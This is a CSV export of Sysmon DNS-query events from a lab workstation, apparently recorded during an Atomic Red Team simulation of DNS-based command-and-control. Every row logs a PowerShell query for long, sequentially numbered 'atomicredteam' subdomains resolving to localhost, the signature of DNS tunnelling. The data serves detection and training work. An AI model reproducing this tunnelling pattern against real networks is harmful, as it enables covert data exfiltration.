"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-22 14:01:31.396 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166496,"Query: 166.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamat.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.409","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.396 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166497,"Query: 167.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamato.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.453","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.396 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166498,"Query: 168.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatom.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.625","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.396 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166499,"Query: 169.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomi.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.670","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.396 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166500,"Query: 170.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomic.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.714","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.396 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166501,"Query: 171.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicr.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.755","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.396 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166502,"Query: 172.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicre.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.799","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.397 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166503,"Query: 173.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicred.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.843","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.397 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166504,"Query: 174.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredt.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.888","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:31.397 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166505,"Query: 175.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredte.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:30.930","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.408 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166506,"Query: 176.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredtea.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.102","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.408 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166507,"Query: 177.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteam.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.147","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.408 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166508,"Query: 178.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteama.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.471","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.408 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166509,"Query: 179.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamat.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.514","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.409 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166510,"Query: 180.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamato.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.560","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.409 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166511,"Query: 181.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatom.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.602","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.409 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166512,"Query: 182.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomi.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.644","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.409 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166513,"Query: 183.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomic.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.689","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.409 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166514,"Query: 184.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicr.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.734","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.409 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166515,"Query: 185.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicre.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.774","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.410 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166516,"Query: 186.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicred.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.816","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.410 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166517,"Query: 187.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredt.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.858","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.410 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166518,"Query: 188.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredte.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.902","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.410 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166519,"Query: 189.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredtea.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.946","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.410 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166520,"Query: 190.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteam.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:31.987","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.410 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166521,"Query: 191.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteama.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.027","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.410 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166522,"Query: 192.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamat.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.072","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.411 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166523,"Query: 193.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamato.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.254","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.411 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166524,"Query: 194.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatom.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.300","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:32.411 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166525,"Query: 195.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomi.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.348","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:33.418 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166526,"Query: 196.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomic.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.393","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:33.418 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166527,"Query: 197.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicr.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.437","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:33.418 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166528,"Query: 198.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicre.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.481","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:33.418 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166529,"Query: 199.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicred.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.525","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:33.418 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166530,"Query: 200.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredt.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.570","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:33.419 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166531,"Query: 201.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredte.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.613","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 14:01:33.419 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166532,"Query: 202.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredteamatomicredte.atomicredteamatomicredteamatomicredteamatomicredtea.a.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6624 ¦ PGUID: E9F06A57-411D-6949-5805-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 13:01:32.658","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
